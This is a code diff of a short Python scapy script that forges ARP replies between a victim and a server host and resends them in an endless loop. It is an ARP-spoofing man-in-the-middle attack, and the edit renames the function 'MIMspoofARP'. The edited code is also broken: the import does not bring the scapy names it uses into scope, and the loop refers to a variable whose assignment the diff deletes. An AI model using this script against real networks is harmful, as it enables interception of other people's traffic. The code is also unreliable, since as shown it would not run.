@@ -1,4 +1,5 @@
- 
+import scapy.all
+
 import time
 
 interface = conf.iface
@@ -13,7 +14,9 @@ ipVictim = "255.255.255.255"
 macServer = "ff:ff:ff:ff:ff:ff"
 ipServer = "255.255.255.255"
 
-def mkspoofARP(ipVictim, ipServer):
+
+
+def MIMspoofARP(ipVictim, ipServer):
     macVictim = getmacbyip(ipVictim)
     macServer = getmacbyip(ipServer)
 
@@ -31,11 +34,7 @@ def mkspoofARP(ipVictim, ipServer):
     arpFrom[ARP].hwdst = macServer
     arpFrom[ARP].pdst = ipServer
 
-    return (arpTo, arpFrom)
-
-ARPmsg = mkspoofARP(ipVictim, ipServer)
-
-while(True):
-    sendp(ARPmsg[0], iface=interface)
-    sendp(ARPmsg[1], iface=interface)
-    time.sleep(3600)
+    while(True):
+        sendp(ARPmsg[0], iface=interface)
+        sendp(ARPmsg[1], iface=interface)
+        time.sleep(3600)
